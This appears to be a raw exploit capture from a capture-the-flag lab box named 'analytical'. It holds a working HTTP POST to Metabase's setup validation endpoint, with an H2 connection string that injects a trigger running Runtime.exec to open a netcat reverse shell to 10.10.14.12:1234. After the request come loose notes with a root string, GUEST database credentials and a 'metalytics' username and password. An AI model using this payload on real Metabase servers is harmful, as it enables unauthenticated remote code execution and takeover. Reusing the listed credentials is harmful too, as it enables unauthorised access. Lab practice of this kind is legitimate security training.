POST /api/setup/validate HTTP/1.1

Host: data.analytical.htb

Content-Type: application/json

Content-Length: 769



{

    "token": "249fa03d-fd94-4d5b-b94f-b4ebf3df681f",

    "details":

    {

        "is_on_demand": false,

        "is_full_sync": false,

        "is_sample": false,

        "cache_ttl": null,

        "refingerprint": false,

        "auto_run_queries": true,

        "schedules":

        {},

        "details":

        {

            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {nc,10.10.14.12,1234,-e,/bin/sh}')\n$$--=x",

            "advanced-options": false,

            "ssl": true

        },

        "name": "an-sec-research-team",

        "engine": "h2"

    }

}












root:f80006ccdc7

db user=GUEST
password=GUEST


metalytics
An4lytics_ds20223#